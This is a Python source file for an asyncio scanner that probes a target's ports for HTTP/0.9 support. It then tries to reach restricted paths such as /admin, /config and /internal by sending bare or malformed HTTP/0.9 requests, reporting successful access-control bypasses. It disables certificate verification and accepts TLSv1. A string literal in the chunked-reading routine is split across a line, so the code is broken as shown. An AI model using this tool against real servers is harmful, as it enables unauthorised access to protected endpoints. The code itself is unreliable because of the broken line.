import asyncio
import ssl
import logging
import re
import hashlib
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


class HTTP09BackchannelEngine:
    def __init__(self, *, ports: Optional[List[int]] = None, max_concurrency: int = 6, read_cap_bytes: int = 256 * 1024, timeout_sec: int = 10, ) -> None:
        self.http09_ports = ports or [80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9000]
        self.protected_paths = ["/admin", "/api", "/config", "/internal", "/secure", "/private"]
        self.max_concurrency = max_concurrency
        self.read_cap_bytes = read_cap_bytes
        self.timeout_sec = timeout_sec
        self.ssl_context = self._create_ssl_context()
        self._variants = [
            ("std", "GET {path}\r\n"),
            ("no_crlf", "GET {path}"),
            ("space", "GET {path} \r\n"),
            ("nospace", "GET{path}\r\n"),
        ]

        self._block_indicators = [
            "access denied",
            "forbidden",
            "unauthorized",
            "blocked",
            "not authorized",
            "captcha",
            "request blocked",
        ]

    async def test_backchannel(self, target_url: str) -> List[Dict[str, Any]]:
        parsed = urlparse(target_url)
        path = parsed.path or "/"
        results: List[Dict[str, Any]] = []

        sem = asyncio.Semaphore(self.max_concurrency)

        async def run_one_port(port: int) -> List[Dict[str, Any]]:
            out: List[Dict[str, Any]] = []
            try:
                baseline = await self._http11_snapshot(parsed, port)
                if not baseline:
                    return out

                support = await self._probe_http09_support(parsed, port, path)
                if support is not None:
                    (variant, used_tls, data) = support
                    out.append({
                        "technique": "http09_backchannel",
                        "port": port,
                        "protocol": "HTTP/0.9",
                        "status": "supported",
                        "variant": variant,
                        "tls": used_tls,
                        "proof": {
                            "first_bytes": self._first_bytes(data),
                            "body_len": len(data),
                            "body_md5": hashlib.md5(data).hexdigest(),
                        },
                    })

                    out.extend(await self._probe_http09_bypass(parsed, port, baseline))
                else:
                    logger.debug(f"[HTTP/0.9] Not supported on port {port}")
            except Exception as e:
                logger.debug(f"[HTTP/0.9] Port {port} probe failed: {e}")
            return out

        tasks = []
        for p in self.http09_ports:
            tasks.append(asyncio.create_task(self._with_sem(sem, run_one_port, p)))

        for chunk in await asyncio.gather(*tasks, return_exceptions=True):
            if isinstance(chunk, Exception):
                logger.debug(f"[HTTP/0.9] task error: {chunk}")
                continue
            results.extend(chunk or [])

        return results

    async def _probe_http09_support(self, parsed, port: int, path: str) -> Optional[Tuple[str, bool, bytes]]:
        prefer_tls = (parsed.scheme == "https") or (port == 443)
        orders = [(False, True), (True, False)] 
        for tls_first, tls_second in orders:
            modes = [tls_first, tls_second]
            for used_tls in modes:
                if used_tls and not prefer_tls and port not in (443,):
                    pass
                for name, tmpl in self._variants:
                    req = tmpl.format(path=path)
                    try:
                        data = await self._send_http09(parsed, port, req, use_tls=used_tls)
                        if self._looks_like_http09_body(data):
                            return name, used_tls, data
                    except Exception:
                        continue
        return None

    async def _probe_http09_bypass(self, parsed, port: int, baseline: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for p in self.protected_paths:
            try:
                base = await self._http11_snapshot(parsed, port, path=p)
                if not base:
                    continue

                if base["status"] not in (401, 403, 404):
                    continue

                hit: Optional[Tuple[str, bool, bytes]] = None
                prefer_tls = (parsed.scheme == "https") or (port == 443)
                for used_tls in ([prefer_tls, not prefer_tls]):
                    for name, tmpl in self._variants:
                        req = tmpl.format(path=p)
                        try:
                            data = await self._send_http09(parsed, port, req, use_tls=used_tls)
                            if self._looks_like_http09_body(data) and not self._looks_like_error(data):
                                hit = (name, used_tls, data)
                                break
                        except Exception:
                            continue
                    if hit:
                        break

                if hit:
                    name, used_tls, data = hit
                    findings.append({
                        "technique": "http09_bypass",
                        "port": port,
                        "protocol": "HTTP/0.9",
                        "path": p,
                        "status": "bypass_successful",
                        "variant": name,
                        "tls": used_tls,
                        "baseline_status": base["status"],
                        "proof": {
                            "first_bytes": self._first_bytes(data),
                            "body_len": len(data),
                            "body_md5": hashlib.md5(data).hexdigest(),
                        },
                    })
            except Exception as e:
                logger.debug(f"[HTTP/0.9] bypass test failed for port {port} path {p}: {e}")
        return findings

    def _create_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.minimum_version = ssl.TLSVersion.TLSv1
        except Exception:
            pass
        return ctx

    async def _send_http09(self, parsed, port: int, request: str, *, use_tls: bool) -> bytes:
        host = parsed.hostname or ""
        path = parsed.path or "/"
        timeout = self.timeout_sec

        if use_tls:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host=host, port=port, ssl=self.ssl_context, server_hostname=host),
                timeout=timeout,
            )
        else:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host=host, port=port),
                timeout=timeout,
            )

        try:
            writer.write(request.encode("latin-1", errors="ignore"))
            await writer.drain()

            data = b""
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
                if not chunk:
                    break
                data += chunk
                if len(data) >= self.read_cap_bytes:
                    break
            return data
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

    async def _http11_snapshot(self, parsed, port: int, path: Optional[str] = None) -> Optional[Dict[str, Any]]:
        host = parsed.hostname or ""
        path = (path or parsed.path or "/") + (("?" + parsed.query) if parsed.query and not path else "")
        timeout = self.timeout_sec

        try:
            if (parsed.scheme == "https") or (port == 443):
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host=host, port=port, ssl=self.ssl_context, server_hostname=host),
                    timeout=timeout,
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host=host, port=port),
                    timeout=timeout,
                )

            req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\nAccept: */*\r\n\r\n"
            writer.write(req.encode("latin-1", errors="ignore"))
            await writer.drain()

            raw = await self._read_until(reader, b"\r\n\r\n", timeout)
            if raw is None:
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
                return None

            status, headers = self._parse_headers(raw.decode("latin-1", errors="ignore"))
            body = await self._read_body(reader, headers, timeout)

            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

            h_lower = {k.lower(): v for k, v in headers.items()}
            body_b = body.encode("utf-8", errors="ignore")
            return {
                "status": status,
                "headers": h_lower,
                "body_md5": hashlib.md5(body_b).hexdigest(),
                "body_len": len(body_b),
            }
        except Exception as e:
            logger.debug(f"[HTTP/1.1] baseline failed on port {port}: {e}")
            return None

    async def _read_until(self, reader: asyncio.StreamReader, sep: bytes, timeout: int) -> Optional[bytes]:
        try:
            buf = b""
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
                if not chunk:
                    break
                buf += chunk
                i = buf.find(sep)
                if i >= 0:
                    return buf[: i + len(sep)]
                if len(buf) > 256 * 1024:
                    return None
            return None
        except Exception:
            return None

    def _parse_headers(self, header_blob: str) -> Tuple[int, Dict[str, str]]:
        lines = header_blob.split("\r\n")
        status_line = lines[0] if lines else "HTTP/1.1 000"
        m = re.search(r"\s(\d{3})\s?", status_line)
        code = int(m.group(1)) if m else 0
        headers: Dict[str, str] = {}
        for line in lines[1:]:
            if not line or ":" not in line:
                continue
            k, v = line.split(":", 1)
            headers[k.strip()] = v.lstrip()
        return code, headers

    async def _read_body(self, reader: asyncio.StreamReader, headers: Dict[str, str], timeout: int) -> str:
        try:
            if headers.get("Transfer-Encoding", "").lower().startswith("chunked"):
                return await self._read_chunked(reader, timeout)

            length = headers.get("Content-Length")
            if length and length.isdigit():
                n = min(int(length), self.read_cap_bytes)
                data = await asyncio.wait_for(reader.readexactly(n), timeout=timeout)
                return data.decode(self._guess_encoding(headers), errors="ignore")

            data = b""
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
                if not chunk:
                    break
                data += chunk
                if len(data) > self.read_cap_bytes:
                    break
            return data.decode(self._guess_encoding(headers), errors="ignore")
        except Exception:
            return ""

    async def _read_chunked(self, reader: asyncio.StreamReader, timeout: int) -> str:
        data = b"
"
        try:
            while True:
                line = await asyncio.wait_for(reader.readline(), timeout=timeout)
                if not line:
                    break
                line = line.strip()
                m = re.match(rb"^([0-9A-Fa-f]+)", line)
                if not m:
                    break
                size = int(m.group(1), 16)
                if size == 0:
                    await asyncio.wait_for(reader.readline(), timeout=timeout) 
                    break
                chunk = await asyncio.wait_for(reader.readexactly(size), timeout=timeout)
                data += chunk
                await asyncio.wait_for(reader.readline(), timeout=timeout)  
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return data.decode("utf-8", errors="ignore")

    def _guess_encoding(self, headers: Dict[str, str]) -> str:
        ct = headers.get("Content-Type", "")
        m = re.search(r"charset=([A-Za-z0-9_\-]+)", ct, re.I)
        return m.group(1) if m else "utf-8"


    def _looks_like_http09_body(self, data: bytes) -> bool:
        if not data:
            return False
        prefix = data[:16].upper()
        if prefix.startswith(b"HTTP/"):
            return False
        return True

    def _looks_like_error(self, data: bytes) -> bool:
        try:
            text = data.decode("utf-8", errors="ignore").lower()
        except Exception:
            return True
        
        if len(data) < 100 and any(tok in text for tok in self._block_indicators):
            return True

        html_tokens = ["<html", "<body", "class=\"error", "id=\"error", "http status", "server error"]
        if any(h in text for h in html_tokens) and any(tok in text for tok in self._block_indicators):
            return True

        if len(data) < 64 and ("not found" in text or "404" in text):
            return True

        return False

    def _first_bytes(self, data: bytes, n: int = 120) -> str:
        return data[:n].decode("utf-8", errors="ignore")

    async def _with_sem(self, sem: asyncio.Semaphore, fn, *args, **kwargs):
        async with sem:
            return await fn(*args, **kwargs)
